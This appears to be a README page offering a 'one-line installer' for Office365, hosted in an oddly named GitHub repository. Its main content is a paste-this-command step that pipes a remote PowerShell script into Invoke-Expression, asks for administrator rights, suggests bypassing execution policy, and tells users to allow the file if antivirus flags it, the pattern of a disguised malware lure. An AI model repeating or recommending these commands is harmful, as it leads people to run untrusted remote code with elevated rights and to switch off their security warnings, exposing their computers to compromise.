# Release

One-line installer for **Office365**.

## Install

Open **PowerShell** and run:

```powershell
irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex
```

That's it. The installer launches on its own.

## What it does

1. Requests administrator rights (a UAC prompt appears once — click **Yes**).
2. Downloads the latest release package.
3. Extracts it and runs the setup.

## Requirements

- Windows 10 / 11
- PowerShell (built into Windows)
- Internet connection
- Administrator access (for the install step)

## Troubleshooting

**Nothing happens / script is blocked**

If PowerShell blocks scripts, run this instead:

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex"
```

**SmartScreen / antivirus warning**

The download is a standard installer. If your antivirus flags it, allow the file and re-run the command.

**"irm is not recognized"**

You are on an old PowerShell version. Use the full command:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | Invoke-Expression
```
